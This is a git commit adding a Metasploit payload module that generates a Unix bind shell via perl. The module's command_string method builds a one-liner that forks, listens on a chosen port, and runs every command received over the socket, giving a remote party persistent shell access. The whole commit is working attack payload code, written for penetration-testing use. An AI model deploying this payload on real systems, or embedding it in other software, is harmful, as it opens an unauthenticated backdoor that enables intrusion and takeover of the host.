49016b9d99ebc9d4460d2b478589c5f928d36db9
bmc <>
2006-01-20 22:31:58 +0000

    * perl bind shell
    git-svn-id: file:///home/svn/incoming/trunk@3417 4d416f70-5f16-0410-b530-b9f4589650da

---
+++ modules/payloads/singles/cmd/unix/bind_perl.rb
@@ -0,0 +1,54 @@
+require 'msf/core'
+require 'msf/core/handler/bind_tcp'
+require 'msf/base/sessions/command_shell'
+
+module Msf
+module Payloads
+module Singles
+module Cmd
+module Unix
+
+module BindPerl
+
+	include Msf::Payload::Single
+
+	def initialize(info = {})
+		super(merge_info(info,
+			'Name'          => 'Unix Command Shell, Bind TCP (via perl)',
+			'Version'       => '$Revision$',
+			'Description'   => 'Listen for a connection and spawn a command shell (persistant)',
+			'Author'        => ['Samy <samy@samy.pl>', 'cazz'],
+			'License'       => GPL_LICENSE,
+			'Platform'      => 'unix',
+			'Arch'          => ARCH_CMD,
+			'Handler'       => Msf::Handler::BindTcp,
+			'Session'       => Msf::Sessions::CommandShell,
+			'PayloadType'   => 'cmd',
+			'Payload'       =>
+				{
+					'Offsets' => { },
+					'Payload' => ''
+				}
+			))
+	end
+
+	#
+	# Constructs the payload
+	#
+	def generate
+		return super + command_string
+	end
+	
+	#
+	# Returns the command string to use for execution
+	#
+	def command_string
+
+		cmd = "perl -MIO -e '$p=fork();exit,if$p;while($c=new IO::Socket::INET(LocalPort,#{datastore['LPORT']},Reuse,1,Listen)->accept){$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>}'"
+
+		return cmd
+	end
+
+end
+
+end end end end end
